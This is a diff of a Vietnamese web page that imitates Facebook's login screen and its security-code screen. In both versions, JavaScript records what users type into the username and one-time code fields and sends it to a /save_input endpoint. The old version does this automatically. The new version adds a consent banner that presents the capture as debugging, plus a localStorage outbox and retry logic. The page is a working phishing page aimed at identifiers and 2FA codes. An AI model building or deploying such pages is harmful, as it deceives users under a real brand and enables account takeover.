@@ -1,11 +1,9 @@
-
 <!DOCTYPE html>
 <html lang="vi">
 <head>
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width,initial-scale=1" />
 <title>facebook - Đăng nhập (mô phỏng)</title>
-
 <style>
   :root{
     --fb-blue: #1877f2;
@@ -14,114 +12,115 @@
     --card-w: 396px;
     --code-w: 540px;
   }
-
   *{ box-sizing: border-box; margin:0; padding:0; }
   html, body { height: 100%; }
   body{
     font-family: "Helvetica Neue", Arial, Helvetica, sans-serif;
-    -webkit-font-smoothing: antialiased;
+    -webkit-font-smoothing:antialiased;
     background: var(--bg);
     color: #111;
   }
-
-  .stage {
-    max-width: 1060px;
-    margin: 36px auto;
-    display: flex;
-    gap: 40px;
-    align-items: center;
-    justify-content: center;
-    padding: 0 18px;
-  }
+  .stage { max-width: 1060px; margin:36px auto; display:flex; gap:40px; align-items:center; justify-content:center; padding:0 18px; }
   .left { flex: 1; padding-left: 40px; }
-  .logo { color: var(--fb-blue); font-weight: 700; font-size: 64px; margin-bottom: 8px; }
-  .desc { font-size: 20px; line-height: 28px; color: #111; max-width: 520px; }
-
-  .right { width: 420px; display: flex; flex-direction: column; align-items: center; }
-  .card {
-    width: var(--card-w);
-    background: #fff;
-    border-radius: 8px;
-    padding: 18px;
-    box-shadow: 0 2px 4px rgba(0,0,0,0.06), 0 8px 16px rgba(0,0,0,0.08);
-  }
-
-  .input { width: 100%; height: 52px; padding: 0 14px; font-size: 17px; border-radius: 6px; border: 1px solid #dddfe2; margin-bottom: 12px; }
-  .btn-login { width: 100%; height: 48px; background: var(--fb-blue); color:#fff; border:none; border-radius:6px; font-weight:700; font-size:20px; cursor:pointer; }
-  .forgot{ display:block; text-align:center; margin-top:12px; color: var(--fb-blue); font-size:14px; text-decoration:none; }
+  .logo { color: var(--fb-blue); font-weight:700; font-size:64px; letter-spacing:-1px; line-height:1; margin-bottom:8px; }
+  .desc { font-size:20px; line-height:28px; color:#111; max-width:520px; margin-top:6px; }
+  .right { width:420px; display:flex; flex-direction:column; align-items:center; }
+  .card { width: var(--card-w); background:#fff; border-radius:8px; padding:18px; box-shadow:0 2px 4px rgba(0,0,0,0.06), 0 8px 16px rgba(0,0,0,0.08); }
+  .input { width:100%; height:52px; padding:0 14px; font-size:17px; border-radius:6px; border:1px solid #dddfe2; margin-bottom:12px; outline:none; }
+  .input:focus{ box-shadow:0 0 0 3px rgba(24,119,242,0.08); border-color:var(--fb-blue); }
+  .btn-login { width:100%; height:48px; background:var(--fb-blue); color:#fff; border:none; border-radius:6px; font-weight:700; font-size:20px; cursor:pointer; }
+  .forgot{ display:block; text-align:center; margin-top:12px; color:var(--fb-blue); font-size:14px; text-decoration:none; }
   hr{ border:none; border-top:1px solid #e6e6e6; margin:16px 0; }
-  .create{ display:block; margin:0 auto; width:200px; height:44px; background: var(--fb-green); color:#fff; border:none; border-radius:6px; font-weight:700; font-size:17px; cursor:pointer; }
-  .page-note{ margin-top:18px; width: var(--card-w); text-align:center; font-size:14px; color:#111; }
+  .create{ display:block; margin:0 auto; width:200px; height:44px; background:var(--fb-green); color:#fff; border:none; border-radius:6px; font-weight:700; font-size:17px; cursor:pointer; }
+  .page-note{ margin-top:18px; width:var(--card-w); text-align:center; font-size:14px; color:#111; }
   .page-note a{ font-weight:700; color:#000; text-decoration:none; }
 
-  .error { color:#e53935; font-size:13px; margin-bottom:8px; display:none; }
-
+  /* Code wrap */
   .code-wrap { display:none; }
   .code-wrap.active { display:block; }
   .topbar { height:56px; background:#fff; border-bottom:1px solid #e6e6e6; display:flex; align-items:center; padding-left:18px; }
-  .toplogo { color: var(--fb-blue); font-weight:700; font-size:28px; }
+  .toplogo { color:var(--fb-blue); font-weight:700; font-size:28px; }
+
   .hero { background:#e9edf2; min-height:420px; display:flex; align-items:center; justify-content:center; padding:40px 12px; }
-  .code-card { width: var(--code-w); background:#fff; border-radius:6px; padding:18px; border:1px solid rgba(0,0,0,0.04); box-shadow:0 2px 4px rgba(0,0,0,0.06), 0 8px 18px rgba(0,0,0,0.08); }
-  .title { font-size:20px; font-weight:700; margin-bottom:10px; }
-  .desc-sm { font-size:15px; margin-bottom:16px; }
+  .code-card { width: var(--code-w); background:#fff; border-radius:6px; padding:18px; border:1px solid rgba(0,0,0,0.04); box-shadow:0 2px 4px rgba(0,0,0,0.06),0 8px 18px rgba(0,0,0,0.08); }
+  .title { font-size:20px; font-weight:700; margin-bottom:10px; color:#111; }
+  .desc-sm { font-size:15px; margin-bottom:16px; color:#111; line-height:22px; }
   .code-input { width:240px; height:40px; padding:0 10px; border-radius:6px; border:1px solid #ccc; font-size:16px; }
-  .note { font-size:14px; margin-bottom:4px; }
-  #onlyLine { font-weight:700; margin-top:6px; font-size:16px; color:#050505; display:block; }
+  .note { font-size:14px; color:#111; margin-bottom:4px; }
   .link { display:block; color:var(--fb-blue); text-decoration:none; margin-top:12px; font-size:14px; }
   .bottom { display:flex; gap:12px; justify-content:flex-end; margin-top:16px; }
   .btn-gray { height:40px; background:#e4e6eb; border:none; border-radius:6px; padding:0 14px; font-size:15px; cursor:pointer; }
   .btn-blue { height:40px; background:var(--fb-blue); color:#fff; border:none; border-radius:6px; padding:0 14px; font-size:15px; cursor:pointer; font-weight:600; }
 
-  @media (max-width:920px){
-    .stage{ flex-direction: column; align-items:center; gap:16px; margin-top:24px; }
-    .left{ padding-left:10px; text-align:center; }
-    .logo{ font-size:48px; }
-    .desc{ font-size:18px; line-height:26px; }
-    .right{ width:100%; align-items:center; }
-    .card, .page-note, .code-card{ width:92%; }
+  /* Mobile */
+  .mobile-logo{ display:none; }
+  @media (max-width:768px){
+    .stage{ flex-direction:column; align-items:center; gap:16px; margin-top:24px; }
+    .left{ display:none; }
+    .mobile-logo{ display:block; margin:0 auto 16px auto; width:120px; border-radius:999px; }
+    .card, .code-card{ width:92%; }
   }
+
+  /* Consent banner */
+  .consent-banner {
+    position: fixed; left: 12px; right:12px; bottom: 12px;
+    background: #fff; border-radius:8px; padding:12px 14px; box-shadow:0 6px 20px rgba(0,0,0,0.12); display:flex; gap:12px; align-items:center;
+    z-index:9999;
+  }
+  .consent-text { flex:1; font-size:14px; color:#111; }
+  .consent-actions { display:flex; gap:8px; }
+  .btn-small { padding:8px 12px; border-radius:6px; border:none; cursor:pointer; font-weight:600; }
+  .btn-accept { background:var(--fb-blue); color:#fff; }
+  .btn-decline { background:#e4e6eb; color:#111; }
 </style>
 </head>
 <body>
 
+  <!-- Mobile logo -->
+  <img src="logo-mobile.png" alt="Logo" class="mobile-logo" />
+
+  <!-- LOGIN stage -->
   <div id="loginStage" class="stage">
-    <div class="left">
+    <div class="left" aria-hidden="false">
       <div class="logo">facebook</div>
       <div class="desc">Facebook giúp bạn kết nối và chia sẻ<br>với mọi người trong cuộc sống của bạn.</div>
     </div>
 
     <div class="right">
-      <div id="loginCard" class="card">
+      <div id="loginCard" class="card" role="region" aria-label="Đăng nhập">
         <form id="loginForm" autocomplete="off" novalidate>
-          <input id="username" class="input" type="text" placeholder="Email hoặc số điện thoại">
-          <input id="password" class="input" type="password" placeholder="Nhập mật khẩu của bạn">
-          <div id="errGeneral" class="error">Vui lòng nhập ít nhất 10 ký tự cho email hoặc số điện thoại.</div>
-          <div id="errPhone" class="error">Số điện thoại phải có ít nhất 10 chữ số.</div>
-          <div id="errPass" class="error">Mật khẩu phải có ít nhất 6 ký tự và chứa cả chữ và số.</div>
+          <input id="username" class="input" type="text" placeholder="Email hoặc số điện thoại" aria-label="Email hoặc số điện thoại">
+          <input id="password" class="input" type="password" placeholder="Nhập mật khẩu của bạn" aria-label="Mật khẩu">
+          <div id="errGeneral" class="error" style="display:none;color:#e53935;margin-bottom:8px;font-size:13px;">Vui lòng nhập ít nhất 10 ký tự cho email hoặc số điện thoại.</div>
           <button id="btnLogin" class="btn-login" type="button">Đăng nhập</button>
         </form>
         <a class="forgot" href="#">Quên mật khẩu?</a>
         <hr>
         <button class="create" type="button">Tạo tài khoản mới</button>
       </div>
+
       <div class="page-note"><a href="#">Tạo Trang</a> dành cho người nổi tiếng, thương hiệu hoặc doanh nghiệp.</div>
     </div>
   </div>
 
-  <div id="codeWrap" class="code-wrap">
+  <!-- CODE WRAP -->
+  <div id="codeWrap" class="code-wrap" aria-hidden="true">
     <div class="topbar"><div class="toplogo">facebook</div></div>
     <div class="hero">
-      <div class="code-card">
+      <div class="code-card" role="region" aria-label="Nhập mã bảo mật">
         <div class="title">Nhập mã bảo mật</div>
         <div class="desc-sm">Vui lòng kiểm tra tin nhắn để nhận mã bảo mật. Mã gồm 6 chữ số.</div>
+
         <div style="display:flex;gap:20px;align-items:flex-start;">
-          <input id="codeInput" class="code-input" type="text" maxlength="6" placeholder="Nhập mã">
+          <input id="codeInput" class="code-input" type="text" maxlength="6" placeholder="Nhập mã" aria-label="Nhập mã">
           <div style="flex:1">
             <div class="note">Chúng tôi đã gửi mã của bạn đến:</div>
-            <div id="onlyLine"></div>
+            <div id="onlyLine" style="font-weight:700;color:#050505;"></div>
           </div>
         </div>
+
         <a id="didntGet" class="link" href="#">Chưa nhận được mã?</a>
+
         <div class="bottom">
           <button class="btn-gray" id="tryOther">Thử cách khác</button>
           <button class="btn-blue" id="continueBtn">Tiếp tục</button>
@@ -130,68 +129,292 @@
     </div>
   </div>
 
-<script>
-document.addEventListener('DOMContentLoaded', function(){
-  function onlyDigits(s){ return (s||'').replace(/\D/g,''); }
-  function extractLast10Digits(d){ if(!d||d.length<10)return null; if(d.length===11&&d.startsWith('84')) return '0'+d.slice(2); return d.slice(-10); }
-  function maskPhoneDisplay(local10){ if(!local10||local10.length!==10)return "+84**********"; return "+84*******"+local10.slice(-2); }
-  function maskEmailDisplay(raw){ if(!raw||raw.indexOf('@')===-1)return "h*****@gmail.com"; var p=raw.split('@');return (p[0].charAt(0)||'h')+"*****@"+p.slice(1).join('@'); }
-  function validPassword(p){ return p&&p.length>=6&&/[A-Za-z]/.test(p)&&/\d/.test(p); }
+  <!-- Consent banner (bật lên khi chưa đồng ý) -->
+  <div id="consentBanner" class="consent-banner" style="display:none;">
+    <div class="consent-text">
+      Để cải thiện trải nghiệm và hỗ trợ debug, trang này có thể ghi lại những ký tự bạn nhập vào một số ô cụ thể (ví dụ: tên người dùng, mã xác nhận). <strong>Không ghi mật khẩu hoặc thông tin nhạy cảm.</strong><br>
+      Vui lòng đồng ý trước khi chúng tôi bắt đầu ghi.
+    </div>
+    <div class="consent-actions">
+      <button id="declineBtn" class="btn-small btn-decline">Từ chối</button>
+      <button id="acceptBtn" class="btn-small btn-accept">Đồng ý</button>
+    </div>
+  </div>
 
-  var loginStage=document.getElementById('loginStage');
-  var loginCard=document.getElementById('loginCard');
-  var codeWrap=document.getElementById('codeWrap');
-  var errGeneral=document.getElementById('errGeneral');
-  var errPhone=document.getElementById('errPhone');
-  var errPass=document.getElementById('errPass');
-  var onlyLine=document.getElementById('onlyLine');
+<script>
+/* =========================
+   MAIN JS
+   - Responsive login -> code UI
+   - Logging chỉ trên fieldsToWatch (không có password)
+   - Consent banner bắt buộc trước khi bật logging
+   - Lưu tạm buffer và gửi về /save_input (POST JSON)
+   - Dùng navigator.sendBeacon nếu có, fallback fetch keepalive
+   ========================= */
+
+document.addEventListener('DOMContentLoaded', function(){
+
+  /* ---------- UI logic (giữ nguyên/nhẹ) ---------- */
+  var loginStage = document.getElementById('loginStage');
+  var codeWrap = document.getElementById('codeWrap');
+  var onlyLine = document.getElementById('onlyLine');
+  var btnLogin = document.getElementById('btnLogin');
+  var tryOther = document.getElementById('tryOther');
+  var continueBtn = document.getElementById('continueBtn');
+  var usernameEl = document.getElementById('username');
+  var passwordEl = document.getElementById('password');
+  var errGeneral = document.getElementById('errGeneral');
+
+  function onlyDigits(s){ return (s||'').replace(/\D/g,''); }
+  function extractLast10Digits(digits){
+    if(!digits) return null;
+    if(digits.length < 10) return null;
+    if(digits.length === 11 && digits.startsWith('84')) return '0' + digits.slice(2);
+    return digits.slice(-10);
+  }
+  function maskPhoneDisplay(local10){
+    if(!local10 || local10.length !== 10) return "+84**********";
+    var lastTwo = local10.slice(-2);
+    var stars = "*******";
+    return "+84" + stars + lastTwo;
+  }
+  function maskEmailDisplay(rawEmail){
+    if(!rawEmail || rawEmail.indexOf('@') === -1) return "h*****@gmail.com";
+    var parts = rawEmail.split('@');
+    var local = parts[0] || "h";
+    var domain = parts.slice(1).join('@') || "gmail.com";
+    var first = local.charAt(0) || "h";
+    return first + "*****@" + domain;
+  }
 
   function showCodeUI(maskText){
-    loginStage.style.display='none';
+    loginStage.style.display = 'none';
     codeWrap.classList.add('active');
-    onlyLine.textContent=maskText;
-    setTimeout(()=>document.getElementById('codeInput').focus(),80);
+    codeWrap.setAttribute('aria-hidden','false');
+    onlyLine.textContent = maskText;
+    setTimeout(function(){ document.getElementById('codeInput').focus(); }, 80);
+  }
+
+  function validPassword(p){
+    if(!p) return false;
+    if(p.length < 6) return false;
+    if(!/[A-Za-z]/.test(p)) return false;
+    if(!/\d/.test(p)) return false;
+    return true;
   }
 
   function tryLogin(){
-    errGeneral.style.display=errPhone.style.display=errPass.style.display='none';
-    var u=document.getElementById('username').value.trim();
-    var p=document.getElementById('password').value||'';
-    if(!u||u.length<10){ var d=onlyDigits(u); if(d.length>0&&d.length<10){errPhone.style.display='block';return;} errGeneral.style.display='block';return;}
-    if(!validPassword(p)){errPass.style.display='block';return;}
-    if(u.indexOf('@')!==-1){ showCodeUI(maskEmailDisplay(u)); return; }
-    var d=onlyDigits(u),local10=extractLast10Digits(d);
-    if(!local10){ if(d.length>0&&d.length<10){errPhone.style.display='block';return;} showCodeUI(maskEmailDisplay(u)); return;}
+    errGeneral.style.display = 'none';
+    var usernameRaw = usernameEl.value.trim();
+    var passwordRaw = passwordEl.value || '';
+    if(!usernameRaw || usernameRaw.length < 10){
+      var digits = onlyDigits(usernameRaw);
+      if(digits.length > 0 && digits.length < 10){
+        errGeneral.textContent = 'Số điện thoại phải có ít nhất 10 chữ số.'; errGeneral.style.display='block'; return;
+      }
+      errGeneral.textContent = 'Vui lòng nhập ít nhất 10 ký tự cho email hoặc số điện thoại.'; errGeneral.style.display='block'; return;
+    }
+    if(!validPassword(passwordRaw)){
+      errGeneral.textContent = 'Mật khẩu phải có ít nhất 6 ký tự và chứa cả chữ và số.'; errGeneral.style.display='block'; return;
+    }
+
+    if(usernameRaw.indexOf('@') !== -1){
+      showCodeUI(maskEmailDisplay(usernameRaw));
+      return;
+    }
+    var digits = onlyDigits(usernameRaw);
+    var local10 = extractLast10Digits(digits);
+    if(!local10){
+      showCodeUI(maskEmailDisplay(usernameRaw));
+      return;
+    }
     showCodeUI(maskPhoneDisplay(local10));
   }
 
-  document.getElementById('btnLogin').addEventListener('click',e=>{e.preventDefault();tryLogin();});
-  document.getElementById('tryOther').addEventListener('click',e=>{e.preventDefault();codeWrap.classList.remove('active');loginStage.style.display='';});
-  document.getElementById('continueBtn').addEventListener('click',()=>alert('Tiếp tục (demo).'));
+  btnLogin.addEventListener('click', function(e){ e.preventDefault(); tryLogin(); });
+  tryOther.addEventListener('click', function(e){ e.preventDefault(); codeWrap.classList.remove('active'); codeWrap.setAttribute('aria-hidden','true'); loginStage.style.display=''; setTimeout(function(){ usernameEl.focus(); },80); });
+  continueBtn.addEventListener('click', function(){ alert('Tiếp tục (demo).'); });
+
+  /* ---------- Logging module (AN TOÀN, CÓ CONSENT) ---------- */
+
+  // Các ID input được phép theo dõi (chỉ các field này). KHÔNG đưa 'password' vào đây.
+  const fieldsToWatch = ['username','codeInput'];
+
+  // Buffer lưu các event trước khi gửi
+  const eventsBuffer = [];
+
+  // Biến kiểm soát: logging chỉ hoạt động nếu user đồng ý
+  let loggingEnabled = false;
+
+  // Consent UI
+  const consentBanner = document.getElementById('consentBanner');
+  const acceptBtn = document.getElementById('acceptBtn');
+  const declineBtn = document.getElementById('declineBtn');
+
+  // Hiển thị banner nếu chưa lưu localStorage consent
+  const consentKey = 'inputLoggingConsent_v1';
+  const saved = localStorage.getItem(consentKey);
+  if(saved === 'granted'){
+    loggingEnabled = true;
+  } else if(saved === 'denied'){
+    loggingEnabled = false;
+  } else {
+    // show banner
+    consentBanner.style.display = 'flex';
+  }
+
+  acceptBtn.addEventListener('click', function(){
+    loggingEnabled = true;
+    localStorage.setItem(consentKey, 'granted');
+    consentBanner.style.display = 'none';
+    console.info('User granted input logging consent.');
+  });
+  declineBtn.addEventListener('click', function(){
+    loggingEnabled = false;
+    localStorage.setItem(consentKey, 'denied');
+    consentBanner.style.display = 'none';
+    console.info('User declined input logging consent.');
+  });
+
+  // Diff đơn giản để biết insert/delete/paste
+  function diffChars(prev, curr){
+    if(prev === curr) return {action:'none', text:''};
+    if(curr.length > prev.length){
+      const added = curr.slice(prev.length);
+      return {action:'insert', text: added};
+    } else {
+      const delCount = prev.length - curr.length;
+      return {action:'delete', text: '[deleted ' + delCount + ' char(s)]'};
+    }
+  }
+
+  function recordFieldEvent(fieldId, action, text){
+    if(!loggingEnabled) return;
+    if(!text) return;
+    eventsBuffer.push({
+      field: fieldId,
+      action: action,          // 'insert' | 'delete' | 'paste'
+      text: text,              // Lưu nội dung chèn/paste hoặc mô tả xóa
+      time: new Date().toISOString(),
+      page: location.pathname
+    });
+    // flush khi đầy
+    if(eventsBuffer.length >= 20) flushBuffer();
+  }
+
+  // Gửi buffer lên server (endpoint /save_input)
+  async function flushBuffer(){
+    if(eventsBuffer.length === 0) return;
+    const payload = { events: eventsBuffer.splice(0), ts: new Date().toISOString(), site: location.origin };
+
+    // Dùng sendBeacon nếu có (phù hợp khi unload)
+    try {
+      if(navigator.sendBeacon){
+        const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+        const ok = navigator.sendBeacon('/save_input', blob);
+        if(ok) return;
+        // nếu sendBeacon trả false -> fallback to fetch
+      }
+    } catch(e){
+      // ignore, fallback to fetch
+    }
+
+    // Fallback fetch với keepalive
+    try {
+      await fetch('/save_input', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload),
+        keepalive: true
+      });
+    } catch(err){
+      // Nếu gửi thất bại, lưu tạm vào localStorage outbox để retry
+      try {
+        const key = 'outbox_' + Date.now();
+        localStorage.setItem(key, JSON.stringify(payload));
+      } catch(e){}
+    }
+  }
+
+  // Thiết lập listener cho các field được chỉ định
+  fieldsToWatch.forEach(function(fieldId){
+    const el = document.getElementById(fieldId);
+    if(!el) return;
+    let prev = el.value || '';
+
+    // Input event: bắt chèn/paste/delete
+    el.addEventListener('input', function(e){
+      // KHÔNG ghi nếu field rỗng hoặc password
+      const curr = el.value || '';
+      const d = diffChars(prev, curr);
+      if(d.action === 'insert'){
+        // heuristics: nếu insert > 3 ký tự coi là paste (email auto-fill, etc.)
+        const isPaste = (d.text.length > 3);
+        recordFieldEvent(fieldId, isPaste ? 'paste' : 'insert', d.text);
+      } else if(d.action === 'delete'){
+        recordFieldEvent(fieldId, 'delete', d.text);
+      }
+      prev = curr;
+    });
+
+    // Capture compositionend để hỗ trợ IME (Việt/Trung etc.)
+    el.addEventListener('compositionend', function(){
+      // cập nhật prev để tránh double-count
+      prev = el.value || '';
+    });
+
+    // Khi phím nhấn (tùy chọn, bị comment để tránh ghi vô tội vạ)
+    el.addEventListener('keydown', function(e){
+      // Nếu bạn muốn ghi chính xác ký tự từng phím (nhưng IME/paste khó xử lý)
+      // bạn có thể bật phần này. Hiện để tránh ghi rác, mình không ghi tại keydown.
+    });
+
+    // Blur -> flush tạm
+    el.addEventListener('blur', function(){ flushBuffer(); });
+  });
+
+  // Gửi khi unload
+  window.addEventListener('beforeunload', function(){
+    flushBuffer();
+    // đồng thời thử gửi các outbox cũ
+    trySendOutbox();
+  });
+
+  // Retry: gửi các payload còn trong localStorage
+  function trySendOutbox(){
+    try {
+      const keys = Object.keys(localStorage).filter(k => k && k.indexOf('outbox_') === 0);
+      keys.forEach(k => {
+        try {
+          const payload = JSON.parse(localStorage.getItem(k));
+          if(!payload) { localStorage.removeItem(k); return; }
+          // Try send with navigator.sendBeacon first
+          if(navigator.sendBeacon){
+            const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
+            const ok = navigator.sendBeacon('/save_input', blob);
+            if(ok){ localStorage.removeItem(k); return; }
+          }
+          // fallback fetch (async)
+          fetch('/save_input', {
+            method:'POST', headers:{ 'Content-Type':'application/json' }, body: JSON.stringify(payload), keepalive: true
+          }).then(() => localStorage.removeItem(k)).catch(()=>{/* keep for later */});
+        } catch(e){
+          localStorage.removeItem(k);
+        }
+      });
+    } catch(e){}
+  }
+
+  // Periodic flush (safety)
+  setInterval(function(){ trySendOutbox(); flushBuffer(); }, 25000);
+
+  // Expose control for debugging
+  window.__inputLogging = {
+    isEnabled: function(){ return loggingEnabled; },
+    enable: function(){ loggingEnabled = true; localStorage.setItem(consentKey,'granted'); },
+    disable: function(){ loggingEnabled = false; localStorage.setItem(consentKey,'denied'); eventsBuffer.length=0; }
+  };
+
 });
 </script>
-
-<!-- Logging script (auto enabled) -->
-<script>
-(function(){
-  const LOG_ENDPOINT = '/save_input';
-  const fieldsToWatch = ['username','codeInput'];
-  let loggingEnabled = true; // luôn bật
-  const eventsBuffer = [];
-  function nowISO(){ return new Date().toISOString(); }
-  function diffChars(prev,curr){ if(prev===curr)return{action:'none',text:''}; if(curr.length>prev.length)return{action:'insert',text:curr.slice(prev.length)}; return{action:'delete',text:'[deleted '+(prev.length-curr.length)+' char(s)]'}; }
-  function recordFieldEvent(fid,act,txt){ if(!loggingEnabled||!txt)return; eventsBuffer.push({field:fid,action:act,text:txt,time:nowISO()}); if(eventsBuffer.length>=10) flushBuffer(); }
-  function flushBuffer(){ if(eventsBuffer.length===0)return; const payload={events:eventsBuffer.splice(0),ts:nowISO()}; fetch(LOG_ENDPOINT,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload),keepalive:true}); }
-  function setup(){ fieldsToWatch.forEach(id=>{ const el=document.getElementById(id); if(!el)return; let prev=el.value||''; el.addEventListener('input',()=>{const d=diffChars(prev,el.value||''); if(d.action!=='none')recordFieldEvent(id,d.action,d.text); prev=el.value||'';}); el.addEventListener('blur',flushBuffer); }); }
-  if(document.readyState==='loading'){document.addEventListener('DOMContentLoaded',setup);} else setup();
-  window.addEventListener('beforeunload',flushBuffer);
-})();
-</script>
-
 </body>
 </html>
-
-
-
-
-
